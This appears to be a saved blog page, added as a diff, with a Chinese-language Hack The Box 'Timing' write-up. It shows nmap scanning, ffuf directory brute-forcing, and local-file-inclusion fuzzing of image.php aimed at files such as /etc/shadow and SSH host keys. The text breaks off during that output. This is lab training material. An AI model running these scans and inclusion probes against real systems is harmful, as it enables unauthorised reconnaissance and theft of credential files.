@@ -1,0 +1,1676 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Timing - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Timing靶场信息  靶场类型  信息搜集使用nmap进行端口扫描 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.135 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-12-14 00:09 EST Nma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Timing - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Timing靶场信息  靶场类型  信息搜集使用nmap进行端口扫描 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.135 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-12-14 00:09 EST Nma">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/3f90e5fc-5165-447e-ba8d-10d2d71bef4b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/a6ecbfb1-1f6d-4741-a9c8-79a1d5a38651.jpeg">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/ba83c4f8-90f8-41a5-b1db-a4e0c3b1ca75.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/fc8a9d18-d119-413a-a2a2-372e7a75fe39.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/6d0996b9-927d-4596-a907-0bf5acc2007a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/8b10d4e9-4fd4-47cc-b6a6-88f2ac77fd67.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/0119fa62-9817-4a3c-adf4-a9dd033cb157.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/05274cd5-f029-4621-996d-a036e36c7135.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/f0df66af-a67d-49cc-94ab-fa09e4a7d877.png">
+<meta property="article:published_time" content="2022-01-01T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:54:08.668Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/3f90e5fc-5165-447e-ba8d-10d2d71bef4b.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Timing - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Timing - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-01-01T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-01-01
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Timing"><span class="post-toc-text">Hackthebox - Timing</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Timing"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Timing - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-01-01 19:38:36" datetime="2022-01-01T11:38:36.000Z"  itemprop="datePublished">2022-01-01</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Timing"><a href="#Hackthebox-Timing" class="headerlink" title="Hackthebox - Timing"></a>Hackthebox - Timing</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2022/01/01/Hackthebox/Hackthebox-Timing/3f90e5fc-5165-447e-ba8d-10d2d71bef4b.png" class>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2022/01/01/Hackthebox/Hackthebox-Timing/a6ecbfb1-1f6d-4741-a9c8-79a1d5a38651.jpeg" class>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用nmap进行端口扫描</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.135
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 00:09 EST
+Nmap scan report for bogon (10.10.11.135)
+Host is up (0.28s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
+|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
+|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=12/14%OT=22%CT=1%CU=39140%PV=Y%DS=2%DC=T%G=Y%TM=61B828
+OS:78%P=x86_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=F9%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3
+OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F
+OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW
+OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                             
+
+TRACEROUTE (using port 5900/tcp)                                                                                                                                                                                    
+HOP RTT       ADDRESS                                                                                                                                                                                               
+1   278.35 ms 10.10.14.1                                                                                                                                                                                            
+2   278.35 ms bogon (10.10.11.135)                                                                                                                                                                                  
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                               
+Nmap done: 1 IP address (1 host up) scanned in 347.67 seconds
+</code></pre>
+<p>先去80端口看看是什么服务</p>
+<img src="/2022/01/01/Hackthebox/Hackthebox-Timing/ba83c4f8-90f8-41a5-b1db-a4e0c3b1ca75.png" class>
+
+<p>这是一个登录页面，测试一下弱口令没有突破口，扫一下目录看看</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://10.10.11.135/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.135/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 403
+________________________________________________
+
+login.php               [Status: 200, Size: 5609, Words: 1755, Lines: 178]
+images                  [Status: 301, Size: 313, Words: 20, Lines: 10]
+index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
+js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
+css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
+profile.php             [Status: 302, Size: 0, Words: 1, Lines: 1]
+logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
+image.php               [Status: 200, Size: 0, Words: 1, Lines: 1]
+upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
+header.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
+footer.php              [Status: 200, Size: 3937, Words: 1307, Lines: 116]
+.                       [Status: 302, Size: 0, Words: 1, Lines: 1]
+db_conn.php             [Status: 200, Size: 0, Words: 1, Lines: 1]
+:: Progress: [86006/86006] :: Job [1/1] :: 70 req/sec :: Duration: [0:17:21] :: Errors: 8 ::
+</code></pre>
+<p>这边没有跳转的只有一个image.php，但是是空白的，同时还存在一个images目录，我感觉这里有点问题，去看看images目录有啥东西</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://10.10.11.135/images/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.135/images/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 403
+________________________________________________
+
+uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10]
+:: Progress: [86006/86006] :: Job [1/1] :: 78 req/sec :: Duration: [0:15:38] :: Errors: 4 ::
+</code></pre>
+<p>目录&#x2F;images&#x2F;uploads&#x2F;目录，然后还存在一个image.php文件，我总觉得是这个目录内的文件，是通过image.php这个文件来查看的，fuzz一下看看</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://10.10.11.135/image.php?file=FUZZ&quot; -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.135/image.php?file=FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+/etc/httpd/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/ftpchroot          [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/grub.conf          [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/chrootUsers        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/apache2/apache2.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/shadow             [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/fstab              [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/hosts              [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/logrotate.d/proftpd [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/ftphosts           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/logrotate.d/ftp    [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/groups             [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/cron.deny          [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/httpd/access.conf  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/inetd.conf         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/httpd/srm.conf     [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/cron.allow         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/at.allow           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/httpd/httpd.conf   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/aliases            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/lighttpd.conf      [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/chttp.conf         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/issue              [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/anacrontab         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/passwd             [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/httpd/php.ini      [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/mysql/my.cnf       [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/lilo.conf          [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/npasswd            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/profile            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/crontab            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/cups/cupsd.conf    [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/pure-ftpd.conf     [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/pureftpd.passwd    [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/networks           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/motd               [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/bashrc             [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/lsb-release        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/my.cnf             [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php4.4/fcgi/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/logrotate.d/vsftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/pureftpd.pdb       [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php/php4/php.ini   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/samba/smb.conf     [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/ssh/ssh_config     [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/sysconfig/network  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/ftpaccess          [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/apache2/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/passwd             [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php4/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/modules.conf       [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php5/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/termcap            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php/cgi/php.ini    [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/ssh/ssh_host_dsa_key [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/vsftpd.chroot_list [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/resolv.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php.ini            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/vsftpd/vsftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/my.conf            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/cpuinfo           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/filesystems       [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/interrupts        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/ioports           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/syslog.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/modules           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/stat              [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/vsftpd.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php/php.ini        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/wu-ftpd/ftpaccess  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/version           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/network/interfaces [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/bootptab           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/root/anaconda-ks.cfg   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/opt/xampp/etc/php.ini  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/ssh/ssh_host_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/lib/php/php.ini    [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/apache/conf/modsec.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/apache/log   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/apache/logs  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/apache/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/httpd/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/cpanel/logs  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/logs/security_log      [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/cpanel/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/motd               [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/redhat-release     [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/swaps             [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/hosts.deny         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/at.deny            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/etc/php.ini  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/etc/pureftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/php4/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/php5/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/lib/php.ini        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/php5/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/cpanel/logs/license_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/proftp.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/opt/lampp/etc/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/php/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/cpanel/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/www/logs/httpd_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/Zend/etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/lib/php.ini  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/wu-ftpd/ftphosts   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/adm/log/xferlog    [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/apache2/config.inc [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php4/cgi/php.ini   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/apache/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/cpanel/cpanel.config [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/local/www/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/php5/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/cpanel/logs/stats_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache2/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/snmpd.conf         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache2/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/apache/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/logs/security_debug_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/lib/mysql/my.cnf   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/ssh/ssh_host_key   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache-ssl/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/inittab            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/exports            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/hosts.allow        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/cups/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/daemon.log     [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/debug          [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/dmesg          [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/apache/audit_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/dpkg.log       [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/wu-ftpd/ftpusers   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/exim_mainlog   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/mounts            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache2/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/exim_paniclog  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/exim_rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/exim/rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/faillog        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/httpd/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
